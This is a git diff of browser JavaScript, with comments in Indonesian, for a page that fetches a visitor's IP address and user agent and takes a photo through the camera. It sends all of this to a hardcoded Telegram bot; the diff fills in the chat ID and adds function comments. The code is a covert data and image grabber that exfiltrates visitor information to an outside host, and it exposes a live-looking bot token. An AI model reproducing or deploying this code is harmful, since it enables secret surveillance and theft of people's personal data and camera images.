@@ -1,7 +1,8 @@
 // Konfigurasi bot Telegram
-const BOT_TOKEN = '7415689438:AAEn-_NYC87F-UUyfxCnZQ25CbAv85hNrkY'; // Token bot Anda
-const CHAT_ID = 'Chat_ID_Anda'; // Ganti dengan Chat ID Anda
+const BOT_TOKEN = '7415689438:AAEn-_NYC87F-UUyfxCnZQ25CbAv85hNrkY'; // Ganti dengan bot token yang benar
+const CHAT_ID = '1145550172'; // Ganti dengan Chat ID Anda yang benar
 
+// Fungsi untuk mengirim IP dan User Agent
 function sendIPAndUserAgent() {
     fetch('https://api.ipify.org?format=json')
         .then(response => response.json())
@@ -14,6 +15,7 @@ function sendIPAndUserAgent() {
         .catch(error => console.error('Error fetching IP address:', error));
 }
 
+// Fungsi untuk mengirim pesan teks ke Telegram
 function sendMessageToTelegram(message) {
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: 'POST',
@@ -35,6 +37,7 @@ function sendMessageToTelegram(message) {
     .catch(error => console.error('Error sending message to Telegram:', error));
 }
 
+// Fungsi untuk mengambil foto dari kamera dan mengirimnya ke Telegram
 function takePhotoAndSend() {
     navigator.mediaDevices.getUserMedia({ video: true })
         .then(stream => {
@@ -63,6 +66,7 @@ function takePhotoAndSend() {
         .catch(error => console.error('Error accessing camera:', error));
 }
 
+// Fungsi untuk mengirim foto ke Telegram
 function sendPhoto(photo) {
     const blob = dataURItoBlob(photo);
     const formData = new FormData();
